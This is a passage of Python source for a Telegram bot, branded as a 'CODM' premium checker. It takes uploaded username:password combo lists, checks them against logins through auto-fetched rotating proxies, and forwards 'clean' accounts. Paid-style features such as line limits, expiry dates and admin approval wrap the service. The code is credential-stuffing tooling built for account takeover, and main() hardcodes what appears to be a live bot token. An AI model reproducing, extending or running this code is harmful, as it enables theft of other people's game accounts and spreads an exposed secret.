┈➤ {'👑 ADMIN ACCESS' if is_admin(user_id) else '🟢 ACTIVE' if status == 'active' else '🔴 INACTIVE'}

⏰ <b>COOLDOWN STATUS:</b>
┈➤ {cooldown_text}
┈➤ (60 seconds after each check)
"""
    await safe_send_message(update, info_text, parse_mode='HTML', reply_markup=create_user_main_keyboard())

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in user_checkers:
        user_checkers[user_id].stop()
        concurrent_manager.unregister_session(user_id)
        del user_checkers[user_id]
    
    concurrent_manager.clear_queue(user_id)
    
    context.user_data.pop('awaiting_file', None)
    context.user_data.pop('awaiting_announcement', None)
    
    await safe_send_message(update, 
        f"⏹️ <b>Cancelled.</b> Queue cleared.\n\nUse /start to return to menu.", 
        parse_mode='HTML',
        reply_markup=create_back_keyboard()
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = f"""
📚 <b>{stylize_text('CØDM PRΣMIUM BØT CHECKER')}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>📋 COMMANDS:</b>
┈➤ /start - Start the bot
┈➤ /check - Start checking accounts
┈➤ /status - Check your status
┈➤ /queue - View your queue
┈➤ /proxy - Manage proxy settings
┈➤ /help - Show this help
┈➤ /cancel - Cancel current operation

<b>🌐 PROXY COMMANDS:</b>
┈➤ /proxy - Open proxy management menu
┈➤ /proxy_status - View proxy status
┈➤ /proxy_test - Test loaded proxies
┈➤ /proxy_fetch - Auto fetch proxies (admin)
┈➤ /proxy_upload - Upload proxy file (admin)

<b>⚙️ ADMIN COMMANDS:</b>
┈➤ /set_threading <num> - Set concurrent checkers
┈➤ /proxy_fetch - Auto fetch proxies
┈➤ /proxy_upload - Upload proxy file

<b>📦 FILE FORMAT:</b>
┈➤ Send .txt file with username:password
┈➤ One account per line

<b>⚡ FEATURES:</b>
┈➤ 10 users can check simultaneously!
┈➤ Clean account detection
┈➤ Auto queue system
┈➤ Proxy support with auto-rotation
┈➤ Auto proxy fetching from multiple sources

<b>⏰ COOLDOWN POLICY:</b>
┈➤ 60 seconds after EVERY check

<b>👤 Support:</b> @KenshiKupalBoss
"""
    await safe_send_message(update, help_text, parse_mode='HTML', reply_markup=create_back_keyboard())

# ==================== ADMIN MANAGEMENT HANDLERS ====================

admin_states = {}

async def handle_admin_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in admin_states:
        return
    
    state = admin_states[user_id]
    action = state.get('action')
    text = update.message.text.strip()
    
    if action == 'ban':
        if 'user_id' not in state:
            try:
                target_id = int(text)
                state['user_id'] = target_id
                await safe_send_message(update, f"📝 <b>Ban User #{target_id}</b>\n\nSend ban reason (or 'no reason'):", parse_mode='HTML')
            except ValueError:
                await safe_send_message(update, "❌ Invalid user ID.", parse_mode='HTML')
        else:
            reason = text if text != 'no reason' else "No reason provided"
            target_id = state['user_id']
            
            if ban_user(target_id, user_id, reason):
                try:
                    await context.bot.send_message(chat_id=target_id, text=f"🚫 <b>YOU HAVE BEEN BANNED</b>\n\nReason: {reason}", parse_mode='HTML')
                except:
                    pass
                await safe_send_message(update, f"✅ User {target_id} banned!\nReason: {reason}", parse_mode='HTML')
            else:
                await safe_send_message(update, f"❌ Failed to ban user {target_id}.", parse_mode='HTML')
            del admin_states[user_id]
    
    elif action == 'unban':
        try:
            target_id = int(text)
            if unban_user(target_id):
                try:
                    await context.bot.send_message(chat_id=target_id, text=f"✅ <b>YOU HAVE BEEN UNBANNED</b>\n\nYour access has been restored.", parse_mode='HTML')
                except:
                    pass
                await safe_send_message(update, f"✅ User {target_id} unbanned!", parse_mode='HTML')
            else:
                await safe_send_message(update, f"❌ Failed to unban user {target_id}.", parse_mode='HTML')
        except ValueError:
            await safe_send_message(update, "❌ Invalid user ID.", parse_mode='HTML')
        del admin_states[user_id]
    
    elif action == 'delete':
        try:
            target_id = int(text)
            user_info = get_user_info(target_id)
            if user_info:
                name = user_info.get('first_name', 'Unknown')
                admin_states[user_id]['confirm_user'] = target_id
                admin_states[user_id]['action'] = 'delete_confirm'
                await safe_send_message(update, f"⚠️ <b>CONFIRM DELETE</b>\n\nUser: {name} (ID: {target_id})\n\nType <code>CONFIRM</code> to delete:", parse_mode='HTML')
            else:
                await safe_send_message(update, f"❌ User {target_id} not found.", parse_mode='HTML')
                del admin_states[user_id]
        except ValueError:
            await safe_send_message(update, "❌ Invalid user ID.", parse_mode='HTML')
    
    elif action == 'delete_confirm':
        if text.upper() == 'CONFIRM':
            target_id = state.get('confirm_user')
            if target_id and delete_user(target_id):
                await safe_send_message(update, f"✅ User {target_id} permanently deleted!", parse_mode='HTML')
            else:
                await safe_send_message(update, "❌ Failed to delete user.", parse_mode='HTML')
        else:
            await safe_send_message(update, "❌ Deletion cancelled.", parse_mode='HTML')
        del admin_states[user_id]
    
    elif action == 'edit_lines':
        if 'target_id' not in state:
            try:
                target_id = int(text)
                state['target_id'] = target_id
                await safe_send_message(update, f"📝 Edit line limit for User #{target_id}\n\nSend new line limit:", parse_mode='HTML')
            except ValueError:
                await safe_send_message(update, "❌ Invalid user ID.", parse_mode='HTML')
        else:
            try:
                new_limit = int(text)
                target_id = state['target_id']
                if edit_user_lines(target_id, new_limit):
                    await safe_send_message(update, f"✅ User {target_id} line limit updated to {new_limit}!", parse_mode='HTML')
                else:
                    await safe_send_message(update, f"❌ Failed to update user.", parse_mode='HTML')
            except ValueError:
                await safe_send_message(update, "❌ Invalid number.", parse_mode='HTML')
            del admin_states[user_id]
    
    elif action == 'set_expiry':
        if 'target_id' not in state:
            try:
                target_id = int(text)
                state['target_id'] = target_id
                await safe_send_message(update, f"⏰ Set expiry for User #{target_id}\n\nSend days (or 0 for no expiry):", parse_mode='HTML')
            except ValueError:
                await safe_send_message(update, "❌ Invalid user ID.", parse_mode='HTML')
        else:
            try:
                days = int(text)
                target_id = state['target_id']
                if set_user_expiry(target_id, days):
                    if days > 0:
                        await safe_send_message(update, f"✅ User {target_id} expires in {days} days!", parse_mode='HTML')
                    else:
                        await safe_send_message(update, f"✅ User {target_id} expiry removed!", parse_mode='HTML')
                else:
                    await safe_send_message(update, f"❌ Failed to set expiry.", parse_mode='HTML')
            except ValueError:
                await safe_send_message(update, "❌ Invalid number.", parse_mode='HTML')
            del admin_states[user_id]
    
    elif action == 'reset_cooldown':
        try:
            target_id = int(text)
            reset_user_cooldown(target_id)
            await safe_send_message(update, f"✅ Cooldown reset for user {target_id}!", parse_mode='HTML')
        except ValueError:
            await safe_send_message(update, "❌ Invalid user ID.", parse_mode='HTML')
        del admin_states[user_id]

async def handle_announcement(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_announcement'):
        return
    
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return
    
    announcement_text = update.message.text.strip()
    context.user_data['awaiting_announcement'] = False
    
    add_announcement(announcement_text, user_id)
    
    users = load_users()
    sent_count = 0
    
    announcement_message = f"""
📢 <b>{stylize_text('ANNOUNCEMENT')}</b> 📢
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{announcement_text}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Sent by Admin</b>
"""
    
    for uid_str, user_data in users.items():
        if user_data.get('approved', False) and user_data.get('status') != 'banned':
            try:
                await bot_application.bot.send_message(
                    chat_id=int(uid_str),
                    text=announcement_message,
                    parse_mode='HTML'
                )
                sent_count += 1
                await asyncio.sleep(0.1)
            except Exception:
                pass
    
    await safe_send_message(update, f"✅ Announcement sent to {sent_count} users!", parse_mode='HTML', reply_markup=create_admin_main_keyboard())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if context.user_data.get('awaiting_proxy_file'):
        await handle_proxy_file(update, context)
        return
    
    if is_admin(user_id) and user_id in admin_states:
        await handle_admin_input(update, context)
        return
    
    if context.user_data.get('awaiting_file'):
        await handle_document(update, context)
    elif context.user_data.get('awaiting_announcement'):
        await handle_announcement(update, context)
    else:
        await update.message.reply_text("Use /start to see the menu or /help for help.", parse_mode='HTML')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if data == "start_check":
        await check_command_handler(update, context)
    elif data == "my_info":
        await my_info_command(update, context)
    elif data == "queue_status":
        await queue_status_command(update, context)
    elif data == "proxy_menu":
        await proxy_command(update, context)
    elif data == "proxy_status":
        await proxy_status_command(update, context)
    elif data == "proxy_test":
        await proxy_test_command(update, context)
    elif data == "proxy_fetch":
        await proxy_fetch_command(update, context)
    elif data == "proxy_type":
        await proxy_type_command(update, context)
    elif data == "proxy_toggle":
        await proxy_toggle_command(update, context)
    elif data == "proxy_upload":
        await proxy_upload_command(update, context)
    elif data == "proxy_set_direct":
        set_user_proxy_preference(user_id, True, 'direct')
        await safe_send_message(update, "✅ Proxy mode set to DIRECT\n\nNo proxies will be used.", parse_mode='HTML')
        await proxy_command(update, context)
    elif data == "proxy_set_proxy":
        if global_proxy_manager.working_proxies:
            set_user_proxy_preference(user_id, True, 'proxy')
            await safe_send_message(update, f"✅ Proxy mode set to PROXY (Random)\n\nUsing {len(global_proxy_manager.working_proxies)} working proxies.", parse_mode='HTML')
        else:
            await safe_send_message(update, "❌ No working proxies available. Please test proxies first.", parse_mode='HTML')
        await proxy_command(update, context)
    elif data == "proxy_set_rotating":
        if global_proxy_manager.working_proxies:
            set_user_proxy_preference(user_id, True, 'rotating')
            await safe_send_message(update, f"✅ Proxy mode set to ROTATING\n\nProxies will rotate per request. Available: {len(global_proxy_manager.working_proxies)}", parse_mode='HTML')
        else:
            await safe_send_message(update, "❌ No working proxies available. Please test proxies first.", parse_mode='HTML')
        await proxy_command(update, context)
    elif data == "threading_menu":
        await set_threading_command(update, context)
    elif data == "back_to_main":
        if is_admin(user_id):
            await send_welcome_admin(update, context)
        else:
            await send_welcome_user(update, context)
    elif data == "upload_more":
        await check_command_handler(update, context)
    elif data == "cooldown_wait":
        cooldown = get_cooldown_remaining(user_id)
        if cooldown > 0:
            await query.answer(f"Please wait {cooldown} seconds before checking again!", show_alert=True)
        else:
            await check_command_handler(update, context)
    elif data == "download_clean":
        file_path = context.user_data.get(f'clean_file_{user_id}')
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                await query.message.reply_document(document=f, filename=os.path.basename(file_path))
        else:
            await query.message.reply_text("❌ File not found. Please run a new check.")
    elif data == "pending_approvals":
        if is_admin(user_id):
            pending = load_pending()
            if pending:
                text = f"📋 <b>PENDING APPROVALS ({len(pending)})</b>\n\n"
                for uid, u in list(pending.items())[:20]:
                    text += f"👤 {u.get('first_name', uid)} - @{u.get('username', 'no username')}\n🆔 <code>{uid}</code>\n\n"
                await safe_send_message(update, text, parse_mode='HTML')
            else:
                await safe_send_message(update, "No pending approvals.", parse_mode='HTML')
    elif data == "system_status":
        if is_admin(user_id):
            await system_status_command(update, context)
    elif data == "list_users":
        if is_admin(user_id):
            users = load_users()
            total_users = len(users)
            banned_count = sum(1 for u in users.values() if u.get('status') == 'banned')
            
            text = f"📋 <b>USER LIST</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            text += f"📊 Total: {total_users}\n"
            text += f"🚫 Banned: {banned_count}\n\n"
            text += f"<b>Recent Users:</b>\n"
            
            for uid, u in list(users.items())[:30]:
                status_icon = "🟢" if u.get('status') == 'active' else "🔴" if u.get('status') == 'banned' else "⚠️"
                name = u.get('first_name', 'Unknown')[:20]
                text += f"{status_icon} <code>{uid}</code> - {name}\n"
            
            await safe_send_message(update, text, parse_mode='HTML', reply_markup=create_admin_main_keyboard())
    elif data == "send_announcement":
        if is_admin(user_id):
            context.user_data['awaiting_announcement'] = True
            await safe_send_message(update, "📢 Send the announcement message:", parse_mode='HTML')
    elif data == "admin_ban":
        if is_admin(user_id):
            admin_states[user_id] = {'action': 'ban'}
            await safe_send_message(update, "🚫 <b>BAN USER</b>\n\nSend the user ID to ban:", parse_mode='HTML')
    elif data == "admin_unban":
        if is_admin(user_id):
            admin_states[user_id] = {'action': 'unban'}
            await safe_send_message(update, "✅ <b>UNBAN USER</b>\n\nSend the user ID to unban:", parse_mode='HTML')
    elif data == "admin_delete":
        if is_admin(user_id):
            admin_states[user_id] = {'action': 'delete'}
            await safe_send_message(update, "🗑️ <b>DELETE USER</b>\n\n⚠️ WARNING: This permanently deletes the user!\n\nSend the user ID to delete:", parse_mode='HTML')
    elif data == "admin_edit_lines":
        if is_admin(user_id):
            admin_states[user_id] = {'action': 'edit_lines'}
            await safe_send_message(update, "📝 <b>EDIT LINE LIMIT</b>\n\nSend the user ID:", parse_mode='HTML')
    elif data == "admin_set_expiry":
        if is_admin(user_id):
            admin_states[user_id] = {'action': 'set_expiry'}
            await safe_send_message(update, "⏰ <b>SET EXPIRY</b>\n\nSend the user ID:", parse_mode='HTML')
    elif data == "admin_reset_cooldown":
        if is_admin(user_id):
            admin_states[user_id] = {'action': 'reset_cooldown'}
            await safe_send_message(update, "🔄 <b>RESET COOLDOWN</b>\n\nSend the user ID to reset cooldown:", parse_mode='HTML')
    elif data.startswith("approve_"):
        if is_admin(user_id):
            target_id = int(data.split("_")[1])
            if approve_user(target_id, user_id):
                await safe_send_message(update, f"✅ User {target_id} approved!", parse_mode='HTML')
                try:
                    await bot_application.bot.send_message(
                        chat_id=target_id,
                        text=f"✅ <b>ACCESS GRANTED!</b>\n\nYour request has been approved.\nUse /start to begin using the bot.",
                        parse_mode='HTML'
                    )
                except:
                    pass
            else:
                await safe_send_message(update, f"❌ Failed to approve user.", parse_mode='HTML')
    elif data.startswith("reject_"):
        if is_admin(user_id):
            target_id = int(data.split("_")[1])
            if reject_user(target_id):
                await safe_send_message(update, f"❌ User {target_id} rejected.", parse_mode='HTML')
                try:
                    await bot_application.bot.send_message(
                        chat_id=target_id,
                        text=f"❌ <b>ACCESS DENIED</b>\n\nYour request has been rejected.\nContact admin for more information.",
                        parse_mode='HTML'
                    )
                except:
                    pass
            else:
                await safe_send_message(update, f"❌ Failed to reject user.", parse_mode='HTML')

# ==================== MAIN FUNCTION ====================

concurrent_manager = MultiUserConcurrentManager(max_concurrent_users=10)
user_checkers = {}
bot_application = None
bot_cookie_manager = None

async def main():
    global bot_application, bot_cookie_manager, global_proxy_manager, concurrent_manager
    
    start_clean_account_sender()
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  [bold #00FF00] ██████╗ ██████╗ ██████╗ ███╗   ███╗    ██████╗  ██████╗ ████████╗[/bold #00FF00]  ║
║  [bold #00FF00]██╔════╝██╔═══██╗██╔══██╗████╗ ████║    ██╔══██╗██╔═══██╗╚══██╔══╝[/bold #00FF00]  ║
║  [bold #00FF00]██║     ██║   ██║██║  ██║██╔████╔██║    ██████╔╝██║   ██║   ██║   [/bold #00FF00]  ║
║  [bold #00FF00]██║     ██║   ██║██║  ██║██║╚██╔╝██║    ██╔══██╗██║   ██║   ██║   [/bold #00FF00]  ║
║  [bold #00FF00]╚██████╗╚██████╔╝██████╔╝██║ ╚═╝ ██║    ██████╔╝╚██████╔╝   ██║   [/bold #00FF00]  ║
║  [bold #00FF00] ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝    ╚═════╝  ╚═════╝    ╚═╝   [/bold #00FF00]  ║
║                                                                              ║
║  [bold #FF0000]🎮 KENSHI CODM BOT CHECKER v5.2 - PROXY + THREADING (FIXED) 🎮[/bold #FF0000]        ║
║  [dim]PROXY MANAGEMENT | AUTO FETCH | ROTATING PROXIES | THREADING CONTROL[/dim]                     ║
║  [dim]FIXED: Infinite loop on login failures | Proper proxy rotation[/dim]                           ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
    console.print(banner)
    
    COMBO_DIR.mkdir(parents=True, exist_ok=True)
    COMBO_CLEAN_DIR.mkdir(parents=True, exist_ok=True)
    PROXY_DIR.mkdir(parents=True, exist_ok=True)
    PROXY_WORKING_DIR.mkdir(parents=True, exist_ok=True)
    PROXY_BAD_DIR.mkdir(parents=True, exist_ok=True)
    PROXY_ALL_DIR.mkdir(parents=True, exist_ok=True)
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    
    bot_cookie_manager = CookieManager()
    global_proxy_manager = ProxyManager()
    global_proxy_manager.set_connection_type("direct")
    global_proxy_manager.load_proxies_from_file()
    
    example_proxy_file = PROXY_DIR / "proxy.txt"
    if not example_proxy_file.exists():
        with open(example_proxy_file, 'w') as f:
            f.write("# Add your proxies here - one per line\n")
            f.write("# Format: host:port or host:port:username:password\n")
            f.write("# Example:\n")
            f.write("# 192.168.1.1:8080\n")
            f.write("# proxy.example.com:3128:user:pass\n")
        console.print("[yellow]📝 Created proxy/proxy.txt - Add your proxies there![/yellow]")
    
    bot_token = "8382449923:AAEQqhF-gmdhzaFFXMCzkqQHjmwbKmAhZXE"
    
    console.print(Panel(
        f"[bold green]✅ System Ready![/bold green]\n\n"
        f"[cyan]🎮 Version:[/cyan] {BOT_VERSION}\n"
        f"[cyan]👥 Max Concurrent Users:[/cyan] 10\n"
        f"[cyan]🚀 Max Concurrent Checkers:[/cyan] {MAX_CONCURRENT_CHECKERS}\n"
        f"[cyan]🌐 Proxy Support:[/cyan] ✅ ON\n"
        f"[cyan]🌐 Auto Fetch Proxies:[/cyan] ✅\n"
        f"[cyan]🔄 Proxy Rotating:[/cyan] ✅\n"
        f"[cyan]🧹 Clean Forwarding:[/cyan] {'ON' if FORWARD_CLEAN_ACCOUNTS else 'OFF'}\n"
        f"[cyan]👑 Admins:[/cyan] {ADMIN_IDS}\n"
        f"[cyan]⏰ Cooldown:[/cyan] 60 seconds after each check\n"
        f"[cyan]💾 Memory Limit:[/cyan] 420MB\n\n"
        f"[dim]Starting bot with FULL ADMIN CONTROL + PROXY SUPPORT (FIXED)...[/dim]",
        title="⚡ CODM Premium Bot",
        border_style="green",
        box=ROUNDED
    ))
    
    bot_application = Application.builder().token(bot_token).build()
    
    bot_application.add_handler(CommandHandler("start", start_command))
    bot_application.add_handler(CommandHandler("help", help_command))
    bot_application.add_handler(CommandHandler("check", check_command_handler))
    bot_application.add_handler(CommandHandler("status", my_info_command))
    bot_application.add_handler(CommandHandler("queue", queue_status_command))
    bot_application.add_handler(CommandHandler("cancel", cancel_command))
    
    bot_application.add_handler(CommandHandler("proxy", proxy_command))
    bot_application.add_handler(CommandHandler("proxy_status", proxy_status_command))
    bot_application.add_handler(CommandHandler("proxy_test", proxy_test_command))
    bot_application.add_handler(CommandHandler("proxy_fetch", proxy_fetch_command))
    bot_application.add_handler(CommandHandler("proxy_upload", proxy_upload_command))
    
    bot_application.add_handler(CommandHandler("set_threading", set_threading_command))
    
    bot_application.add_handler(CallbackQueryHandler(button_callback))
    bot_application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    bot_application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    console.print("[green]✅ Bot Started![/green]")
    console.print("[magenta]🎮 FULL ADMIN CONTROL ACTIVE![/magenta]")
    console.print("[green]👥 Up to 10 users can check simultaneously![/green]")
    console.print(f"[green]🚀 Max {MAX_CONCURRENT_CHECKERS} concurrent checkers (Railway optimized)[/green]")
    console.print("[cyan]🌐 PROXY MANAGEMENT ACTIVE![/cyan]")
    console.print("[cyan]   - /proxy to manage proxies[/cyan]")
    console.print("[cyan]   - Auto proxy fetching from 7+ sources[/cyan]")
    console.print("[green]🧹 Clean Account Forwarding ACTIVE![/green]")
    console.print("[yellow]⏰ COOLDOWN POLICY: 60 seconds after EVERY check[/yellow]")
    console.print("[cyan]👑 ADMIN COMMANDS: Ban, Unban, Delete, Edit Lines, Set Expiry, Reset Cooldown[/cyan]")
    console.print("[cyan]⚙️ THREADING: /set_threading <num> to adjust concurrent checkers[/cyan]")
    console.print("[dim]💾 Memory watchdog active - 420MB limit[/dim]")
    console.print("[yellow]Press Ctrl+C to stop[/yellow]")
    
    console.print("[cyan]🌐 Auto-fetching proxies from online sources...[/cyan]")
    asyncio.create_task(auto_fetch_proxies())
    
    try:
        await bot_application.initialize()
        await bot_application.start()
        await bot_application.updater.start_polling()
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️ Bot stopped[/yellow]")
        global clean_account_sender_running
        clean_account_sender_running = False
        _shutdown_flag.set()
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print('\n[yellow]⚠️ Stopped by user[/yellow]')
    except Exception as e:
        console.print(f'[red]✘ Error: {e}[/red]')
        import traceback
        traceback.print_exc()